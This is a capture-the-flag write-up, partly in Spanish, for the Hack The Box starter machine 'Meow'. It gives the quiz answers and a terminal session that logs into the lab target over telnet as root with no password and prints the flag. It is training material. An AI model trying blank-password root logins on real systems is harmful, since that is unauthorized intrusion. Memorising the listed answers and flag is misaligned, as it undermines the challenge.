---
title: Meow
date: 2025-04-2 12:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, meow]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/61b5837dfdfe1fb1ca3750cf2712da44.png
    alt: Hack The Box
---

Este primer reto de HackTheBox es una especie de examen de para comenzar en esta plataforma, 
consiste en una serie de preguntas y tareas a completar. Conectarse a la VPN que proporcionan y responder a las preguntas, 
para acabar realizando una captura de bandera simple. 

To attack the target machine, you must be on the same network.
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.
If you don't see an update after 2-3 minutes, refresh the page.
Connect to Pwnbox

Connect using Pwnbox

RECOMMENDED

A preconfigured, browser-based virtual machine with all the hacking tools you need pre-installed.
Free 2h of Pwnbox - Upgrade to VIP+ for Unlimited Access
Connect to OVPN

Connect using OpenVPN

Use your own machine for hacking. Download your VPN configuration and connect from your own environment.
Having Trouble? - Introduction to Lab Access

Spawn Machine

Spawn the target machine and the IP will show here

## Task 1

What does the acronym VM stand for?

>virtual machine

## Task 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

>terminal

## Task 3

What service do we use to form our VPN connection into HTB labs?

>openvpn

## Task 4

What tool do we use to test our connection to the target with an ICMP echo request?

>ping 

## Task 5

What is the name of the most common tool for finding open ports on a target?

>nmap

## Task 6

What service do we identify on port 23/tcp during our scans?

>telnet

## Task 7

What username is able to log into the target over telnet with a blank password?

>root

## Submit Flag

``` shell
pablo☠office meow$ telnet 10.129.76.225 
Trying 10.129.76.225...
Connected to 10.129.76.225.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root

root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

## Submit root flag [achievement](https://www.hackthebox.com/achievement/machine/2336390/394)

Una manera muy elegante de asegurarte de que los usuarios tengan un mínimo de nivel y conocimiento para iniciarte en tu plataforma. 

